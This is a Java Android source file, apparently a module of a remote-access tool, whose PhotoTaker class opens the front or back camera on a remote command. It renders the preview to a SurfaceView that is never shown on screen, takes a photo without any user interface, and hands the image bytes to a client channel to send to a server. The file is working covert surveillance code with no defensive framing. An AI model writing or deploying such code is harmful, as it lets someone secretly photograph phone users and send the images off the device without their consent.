package my.app.Library;

import java.io.IOException;

import my.app.client.ClientListener;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.sax.StartElementListener;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

/**
 * Mit dieser Klasse werden Fotos erstellt und an den Server gesendet.
 */
public class PhotoTaker {
	/**
	 * cam Das Kameraobjekt
	 */
	Camera cam;
	/**
	 * ctx Der Service, welcher das Objekt erstellt oder die Methode aufruft.
	 */
	ClientListener ctx;
	/**
	 * chan Der Kanal für die Datenübertragung
	 */
	int chan ;
	/**
	 * Ein Interface mit dem man die Größe und das Format eine Surface bestimmen kann.
	 */
	SurfaceHolder holder;
	/**
	 * pic Ein Interface um Bilddaten eines Fotos zu erhalten. Diese Methode wird aufgerufen wenn die Bilddaten nach dem Aufnehmen eines Fotos von der Kamera zur Verfügung gestellt werden.
	 */
	private PictureCallback pic = new PictureCallback() {
		/**
		 * Diese Funktion wird aufgerufen sobald Fotodaten vorhanden sind, nachdem ein Foto aufgenommen wurde.
		 * @param data	Die Fotodaten
		 * @param camera	Die Kamera die es aufgenommen hat
		 */
	    public void onPictureTaken(byte[] data, Camera camera) {
			/**
			 * Hier werden die Daten verschickt.
			 */
	    	ctx.handleData(chan, data);
	        Log.i("PhotoTaker", "After take picture !");
			/**
			 * Und die Kamera cam gelöscht.
			 */
	        cam.release();
	        cam = null;
	    }
	};

	/**
	 * Konstrukto der Klasse
	 * @param c Der Service der das Objekt erstellt
	 * @param chan	Der Kanal zur Datenübertragung.
	 */
	public PhotoTaker(ClientListener c, int chan) {
		this.chan = chan ;
		ctx = c;
	}
	/*
	public boolean takePhoto() {
		Intent photoActivity = new Intent(this, PhotoActivity.class);
		photoActivity.setAction(PhotoTaker.class.getName());
		ctx.star
	}
	*/

	/**
	 * Methode zum Erstellen von Fotos.
	 * @return True falls das Foto aufgenommen wurde, falls sonst.
	 */
	public boolean takePhoto(byte[] args) {
		int numCam = Camera.getNumberOfCameras();
		int FrontCam = Camera.CameraInfo.CAMERA_FACING_FRONT;
		int BackCam = Camera.CameraInfo.CAMERA_FACING_BACK;
		/**
		 * Überprüfen ob die Kamera vorhanden ist.
		 */
        if(!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)))
		/**
		 * Ist keine Kamera vorhanden wird false Returned.
		 */
			return false;
        Log.i("PhotoTaker", "Just before Open !");
        try {
			/**
			 * Überprüft ob es mehrere Kameras gibt.
			 */
			if (numCam > 1){
				/**
				 * Ist dies der Fall wird die Kamera mit der gewünschten Orinetierung geöffnet.
				 */
				if (args[0]== 0){
					cam = Camera.open(BackCam);
				}
				else{
					cam = Camera.open(FrontCam);
				}
			}
			/**
			 * Wenn nicht die default Kamera.
			 */
			else {
				cam = Camera.open();
			}

        } catch (Exception e) { return false; }
        
        Log.i("PhotoTaker", "Right after Open !");
		/**
		 * Sollte man keine Zugriff auf die Kamerahardware erhalten, wird false returned.
		 */
        if (cam == null)
        	return false;
        
        SurfaceView view = new SurfaceView(ctx);
        try {
        	holder = view.getHolder();
			/**
			 * Hiermit soll ein LivePreview ermöglicht werden. Diese Preview wird auf der Surface dargestellt.
			 */
        	cam.setPreviewDisplay(holder);
        } catch(IOException e) { return false; }
		/**
		 * Straten der Preview.
		 */
        cam.startPreview();
		/**
		 * Das Bild wird aufgenommen.
		 */
        cam.takePicture(null, null, pic);
		/**
		 * Hier wurde das Bild erfolgreich erstellt. Daher wir true zurückgeliefert.
		 */
        return true;
	}
	

}
